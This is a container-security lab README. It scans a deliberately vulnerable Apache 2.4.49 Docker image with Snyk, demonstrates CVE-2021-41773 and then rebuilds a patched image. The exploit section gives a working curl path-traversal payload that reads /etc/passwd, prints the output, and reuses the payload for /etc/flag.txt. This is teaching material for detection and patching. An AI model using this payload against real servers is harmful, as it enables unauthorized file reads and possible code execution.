# Snyk Vulnerability Scanning: Readme

This scenario involves building a Docker image which includes a vulnerabile package, installed via the Dockerfile.

## Vulnerable Packages

#### CVE-2021-41773

CVE-2021-41773 is a CVE within the Apache HTTP Server, specifically version 2.4.49. 

> A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.

[National Institute of Standards and Technology](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)


## CVE Lab

This lab contains a vulnerable Dockerfile, which includes the Apache 2.4.49 package and its associated configuratons which this CVE required to be installed.


## Scanning with Snyk 
***This step is already done on the Playground instances***

To use Snyk, you must first:

* Sign up for Snyk
* Install the CLI agent using Node (must have NPM installed) `npm install -g snyk`
* Authenticate with snyk `snyk auth "<API KEY>"` (this is already handled on the playground instances)

You can now start to scan local images using Snyk. Snyk will analyise the dependencies installed in the image, and scan them against its backend database of vulnerabilities.

Snyk is already installed on the Playground instances, so we can skip this step.


## Building and Scanning Vulnerable Image

There are two directories within the Docker directory, both containing a Dockerfile and a set of dependencies.

* vulnerable
* safe.

To build the vulnerable image, run the following command:

```bash
$ cd workdir/Hands-on-with-Container-Security/snyk/docker
$ bash build.sh
```

This will create a Docker image using the Dockerfile located in the `vulnerable` directory, and tag it `apache-vulnerable`.

Now you have built the vulnerable Docker image, it's time to scan this using Snyk. To scan a Docker image, run the following:

```bash
$ snyk container test apache-vulnerable


Testing apache-vulnerable...


✗ Low severity vulnerability found in apache2/apache2-bin
  Description: Cross-site Scripting (XSS)
  Info: https://snyk.io/vuln/SNYK-DEBIANUNSTABLE-APACHE2-391822
  Introduced through: apache2/apache2-bin@2.4.49-4, apache2@2.4.49-4, apache2/apache2-data@2.4.49-4, apache2/apache2-utils@2.4.49-4
  From: apache2/apache2-bin@2.4.49-4
  From: apache2@2.4.49-4 > apache2/apache2-bin@2.4.49-4
  From: apache2/apache2-data@2.4.49-4
  and 4 more...

✗ High severity vulnerability found in apache2/apache2-bin
  Description: Directory Traversal
  Info: https://snyk.io/vuln/SNYK-DEBIANUNSTABLE-APACHE2-1728102
  Introduced through: apache2/apache2-bin@2.4.49-4, apache2@2.4.49-4, apache2/apache2-data@2.4.49-4, apache2/apache2-utils@2.4.49-4
  From: apache2/apache2-bin@2.4.49-4
  From: apache2@2.4.49-4 > apache2/apache2-bin@2.4.49-4
  From: apache2/apache2-data@2.4.49-4
  and 4 more...
  Fixed in: 2.4.50-1

✗ High severity vulnerability found in apache2/apache2-bin
  Description: NULL Pointer Dereference
  Info: https://snyk.io/vuln/SNYK-DEBIANUNSTABLE-APACHE2-1728105
  Introduced through: apache2/apache2-bin@2.4.49-4, apache2@2.4.49-4, apache2/apache2-data@2.4.49-4, apache2/apache2-utils@2.4.49-4
  From: apache2/apache2-bin@2.4.49-4
  From: apache2@2.4.49-4 > apache2/apache2-bin@2.4.49-4
  From: apache2/apache2-data@2.4.49-4
  and 4 more...
  Fixed in: 2.4.50-1

✗ Critical severity vulnerability found in apache2/apache2-bin
  Description: Directory Traversal
  Info: https://snyk.io/vuln/SNYK-DEBIANUNSTABLE-APACHE2-1729585
  Introduced through: apache2/apache2-bin@2.4.49-4, apache2@2.4.49-4, apache2/apache2-data@2.4.49-4, apache2/apache2-utils@2.4.49-4
  From: apache2/apache2-bin@2.4.49-4
  From: apache2@2.4.49-4 > apache2/apache2-bin@2.4.49-4
  From: apache2/apache2-data@2.4.49-4
  and 4 more...
  Fixed in: 2.4.51-1



Organization:      ecsdcmhrpr
Package manager:   deb
Project name:      docker-image|apache-vulnerable
Docker image:      apache-vulnerable
Platform:          linux/amd64
Licenses:          enabled

Tested 146 dependencies for known issues, found 55 issues.

Pro tip: use `--file` option to get base image remediation advice.
Example: $ snyk test --docker apache-vulnerable --file=path/to/Dockerfile

To remove this message in the future, please run `snyk config set disableSuggestions=true`

```


## Exploit

We've shown how to detect the vulnerable package, but lets now show you how to exploit it!

First up, start up a new container from the created image

```bash
$ docker run -d -p 9000:80  apache-vulnerable
```

This will start a new container, using the apache-vulnerable image, mapping the port 9000 to the port run on the apache server within the container. The `-d` flag means it will run in the background.

Lets test we can connect to the server:

```bash
$ curl localhost:9000
```


Now, to run the exploit:

```bash
$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

[playground@worker3-snyk ~]$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

This will exploit a flaw in the directory traversal code of the Apache HTTPD server. IN this case, we will use this exploit to read the contents of the "/etc/passwd" file.

To actually retrieve the flag, we will change the command to print the contents of /etc/flag.txt:

```bash
$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
```


## Making it Safe

Now we've demonstrated the exploit and how to scan for the critical vulnerabilities used to run the exploit, lets go and make it safe.

Included in the `docker` directory is a directory called `safe` which includes patched versions of the apache dependencies.

Let's run the following command to build the safe image (apache-safe):

```bash
$ bash build_safe.sh
```

You can create a new container using this image (remember to stop the first one by running docker kill <ID>)

```bash
$ docker run -d -p 9000:80  apache-safe
```

Run the exploit:

```
$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
```

And to scan the new image to confirm the vulnerability is no longer present:

```
$ snyk container test apache-safe
```
